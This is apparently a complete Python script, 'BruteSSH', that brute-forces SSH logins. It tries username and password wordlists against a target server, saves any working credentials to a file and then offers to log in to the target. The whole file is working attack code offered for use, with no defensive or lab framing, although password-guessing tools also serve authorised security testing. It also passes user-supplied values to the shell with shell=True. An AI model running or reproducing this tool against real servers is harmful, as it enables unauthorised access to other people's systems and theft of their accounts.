import argparse
import time
import subprocess
from colorama import Fore, Style
import paramiko
from termcolor import colored
import platform
import socket
import utils

def main():
    # Ambil argumen dari baris perintah
    parser = argparse.ArgumentParser(description='SSH Brute Force Tool')
    parser.add_argument('-s', '--server', required=True, help='IP address of the target server')
    parser.add_argument('-u', '--user', help='Single username for brute force')
    parser.add_argument('-U', '--userlist', help='Location of the username wordlist')
    parser.add_argument('-w', '--password', help='Single password for brute force')
    parser.add_argument('-W', '--passwordlist', help='Location of the password wordlist')
    parser.add_argument('-p', '--port', default=22, type=int, help='SSH port, default is 22')
    args = parser.parse_args()

    # Cek argumen username
    if args.user and args.userlist:
        print(colored('=> Error: Cannot specify both a single username and a username wordlist.', 'red'))
        return
    elif not args.user and not args.userlist:
        print(colored('=> Error: Must specify either a single username or a username wordlist.', 'red'))
        return

    # Cek argumen password
    if args.password and args.passwordlist:
        print(colored('=> Error: Cannot specify both a single password and a password wordlist.', 'red'))
        return
    elif not args.password and not args.passwordlist:
        print(colored('=> Error: Must specify either a single password or a password wordlist.', 'red'))
        return

    # Baca daftar username dari file
    if args.userlist:
        usernames = []
        with open(args.userlist) as f:
            for line in f:
                usernames.append(line.strip())
    else:
        usernames = [args.user]

    # Baca daftar password dari file
    if args.passwordlist:
        passwords = []
        with open(args.passwordlist) as f:
            for line in f:
                passwords.append(line.strip())
    else:
        passwords = [args.password]

    # Bersihkan terminal sebelum masuk ke server
    subprocess.run('clear', shell=True)

    # Banner
    gradient = [Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    print(gradient[0] + "=" * 45)
    print(gradient[1] + " " * 11 + "BruteSSH - SSH Brute Force" + " " * 11)
    print(gradient[2] + " " * 11 + "Version: 1.0" + " " * 14)
    print(gradient[3] + " " * 11 + "By Arseno" + " " * 19)
    print(gradient[4] + "=" * 45 + Style.RESET_ALL)

    # Informasi versi perangkat
    print(gradient[0] + "=" * 45)
    print(gradient[1] + " " * 16 + "Device Information:" + " " * 15)
    print(gradient[2] + " " * 7 + f'[+] Operating System: {platform.system()} {platform.release()}')
    print(gradient[3] + " " * 7 + f'[+] Host Name: {socket.gethostname()}')
    print(gradient[4] + " " * 7 + f'[+] Python Version: {platform.python_version()}' + Style.RESET_ALL)
    print("=" * 45)

    # Tampilkan informasi target server, username, password, dan port
    print(gradient[0] + " " * 16 + "Target Information:" + " " * 15)
    print(gradient[1] + " " * 7 + f'[+] Target Server: {args.server}')
    if args.user:
        print(gradient[2] + " " * 7 + f'[+] Username: {args.user}')
    else:
        print(gradient[3] + " " * 7 + f'[+] Username Wordlist: {args.userlist}')
    if args.password:
        print(gradient[2] + " " * 7 + f'[+] Password: {args.password}')
    else:
        print(gradient[2] + " " * 7 + f'[+] Password Wordlist: {args.passwordlist}')
    print(gradient[3] + " " * 7 + f'[+] SSH Port: {args.port}')
    print(Style.RESET_ALL + '=' * 45)

    # Coba koneksi SSH
    found_credentials = []
    found_error = False
    for i, username in enumerate(usernames, 1):
        for j, password in enumerate(passwords, 1):
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(args.server, port=args.port, username=username, password=password, banner_timeout=2, gss_auth=False, look_for_keys=False, auth_timeout=2, timeout=5)
            except Exception as e:
                if utils.handle_ssh_error(args.server, username, password, i, len(usernames), j, len(passwords), e):
                    found_error = True
                    break
            else:
                found_credentials.append((username, password))
                print(colored(f'=> [{args.port}][ssh] host: {args.server} - login: "{username}" - password: {password}', 'green'))
            finally:
                ssh.close()

        if found_error:
            break

    print('====================')
    print('Credential Check Complete')
    print('====================')

    # Simpan credential yang ditemukan ke dalam file
    with open('credential.txt', 'w') as f:
        for username, password in found_credentials:
            f.write(f'Username: {username}, Password: {password}\n')

    # Cek apakah ada credential yang cocok
    if len(found_credentials) > 0:
        print(f'Found credentials:')
        for username, password in found_credentials:
            print(colored(f'Username: {username}, Password: {password}', 'green'))
        print('====================')

        # Pilihan untuk login atau tidak
        while True:
            choice = input('Do you want to login to the server? (y/n): ')
            if choice.lower() == 'y':
                print(colored('=> Logging in...', 'green'))
                time.sleep(1)
                command = f'ssh {username}@{args.server} -p {args.port}'
                subprocess.run(command, shell=True)
                break
            elif choice.lower() == 'n':
                print(colored('=> Exiting...', 'red'))
                break
            else:
                print(colored('Invalid choice. Please enter y or n.', 'red'))
    else:
        print(colored('No valid credentials found.', 'red'))

if __name__ == '__main__':
    main()
